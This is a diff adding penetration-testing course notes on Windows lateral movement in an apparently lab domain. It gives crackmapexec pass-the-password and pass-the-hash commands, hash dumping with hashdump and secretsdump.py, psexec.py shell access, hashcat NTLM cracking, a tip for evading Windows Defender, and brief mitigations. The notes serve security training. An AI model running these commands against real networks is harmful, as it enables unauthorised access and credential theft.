@@ -1,0 +1,71 @@
+-----------------------------------------------------INTRODUCTION------------------------------------------------------
+we need username & password or shell in the machine to do this attack effectively.
+
+-------------------------------------------------Pass the password / pass the hash-----------------------------------------
+
+if we crack a password or can dump the SAM hashes , we can leverage both for lateral
+movement in networks.
+
+$crackmapexec <1p/CIDR> -u username -d Domain -p Password
+passes through all the subnets
+
+in metasploit (meterpreter) 
+$hashdump
+
+$crackmapexec <ip/CIDR> -u username -H <hash> --local
+
+finding the hash of the local machines , u may find the admin account similar to
+it sometimes may not be.
+
+-----------------------------------------------INSTALLING CRACKMAPEXEC-------------------------------------------------
+
+$apt install crackmapexec
+$crackmapexec
+
+---------------------------------------------PASS THE PASSWORD ATTACKS-----------------------------------------------
+
+$crackmapexec --help
+
+change in course use smb infront.
+
+$crackmapexec smb 192.168.57.0/24 -u fastle -d MARVEL.local -p Password1
+$crackmapexec smb 192.168.57.0/24 -u fastle -d MARVEL.local -p Password1 --SAM (MAYDUMP SAMHASH)
+
+
+$PSEXEC.PY marvel/fcastle:Password1@192.168.57.142
+
+got the shell.
+
+------------------------------------------------------Dumping hashes with secretsdump.py---------------------------------
+
+sometime you may be picked up by the windows defender when using metasploits , so try to use psexec.py or other secretsdump.py
+
+$secretsdump.py marvel/fcastle:Password@192.168.57.141
+$secretsdump.py marvel/fcastle:Password@192.168.57.142
+
+copy and paste the hash in a txt file.
+
+-------------------------------------------------------cracking NTLM HASHES WITH HASHCAT--------------------------------------------------
+
+this hashes are called NTLM , NTLM HASH can pass but NTLMV2 cannot pass
+
+in windows machine:
+
+$hashcat64.exe -m 1000 hashes4.txt rockyou.txt -O 
+
+--------------------------------------------------------Pass the hash attacks-----------------------------------------------------
+
+$crackmapexec smb 192.168.57.0/24 -u "Frank Castle" -H <hash> --local-auth
+
+$psexec.py "frank castle":@192.168.57.141 -hashes LMHASH:NTHASH
+
+----------------------------------------------------------PASS THE ATTACK MITIGATIONS--------------------------------
+
+*Avoid re-using local admin password
+*Privilege access management
+*Utilize strong passwords
+
+---------------------------------------------------------TOKEN IMPERSONATION OVERVIEW----------------------------------------
+
+
+
